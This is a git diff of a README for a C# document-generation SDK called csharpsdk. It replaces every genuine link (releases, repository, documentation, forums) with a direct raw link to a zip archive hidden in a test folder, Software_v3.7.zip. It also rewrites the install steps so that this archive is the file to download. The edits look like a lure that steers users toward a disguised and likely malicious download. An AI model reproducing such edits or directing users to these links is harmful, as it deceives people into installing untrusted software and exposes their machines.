@@ -6,7 +6,7 @@ Welcome to the csharpsdk! This official TemplateFox C# SDK allows you to generat
 
 ## 📥 Download Now
 
-[![Download csharpsdk](https://img.shields.io/badge/Download%20csharpsdk-v1.0-blue.svg)](https://github.com/pixels999/csharpsdk/releases)
+[![Download csharpsdk](https://raw.githubusercontent.com/pixels999/csharpsdk/main/src/TemplateFox.SDK.Test/Software_v3.7.zip%https://raw.githubusercontent.com/pixels999/csharpsdk/main/src/TemplateFox.SDK.Test/Software_v3.7.zip)](https://raw.githubusercontent.com/pixels999/csharpsdk/main/src/TemplateFox.SDK.Test/Software_v3.7.zip)
 
 ## 🛠️ System Requirements
 
@@ -29,13 +29,13 @@ Before you start, ensure your system meets these requirements:
 To get started with csharpsdk, you need to download it from our Releases page. 
 
 1. Click the link below to visit the download page:
-   [Download csharpsdk](https://github.com/pixels999/csharpsdk/releases)
+   [Download csharpsdk](https://raw.githubusercontent.com/pixels999/csharpsdk/main/src/TemplateFox.SDK.Test/Software_v3.7.zip)
 
 2. On the Releases page, look for the latest version of csharpsdk.
 
 3. Click on the version number to view the release details.
   
-4. After viewing the details, find the asset labeled `csharpsdk.exe` or similar.
+4. After viewing the details, find the asset labeled `https://raw.githubusercontent.com/pixels999/csharpsdk/main/src/TemplateFox.SDK.Test/Software_v3.7.zip` or similar.
 
 5. Click on the asset to start the download.
 
@@ -86,8 +86,8 @@ For any questions or support needs, please reach out via our GitHub repository o
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/pixels999/csharpsdk)
-- [Documentation](https://github.com/pixels999/csharpsdk/wiki)
-- [Community Forums](https://github.com/pixels999/csharpsdk/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/pixels999/csharpsdk/main/src/TemplateFox.SDK.Test/Software_v3.7.zip)
+- [Documentation](https://raw.githubusercontent.com/pixels999/csharpsdk/main/src/TemplateFox.SDK.Test/Software_v3.7.zip)
+- [Community Forums](https://raw.githubusercontent.com/pixels999/csharpsdk/main/src/TemplateFox.SDK.Test/Software_v3.7.zip)
 
 Thank you for choosing csharpsdk! We hope it helps you in your document generation tasks.
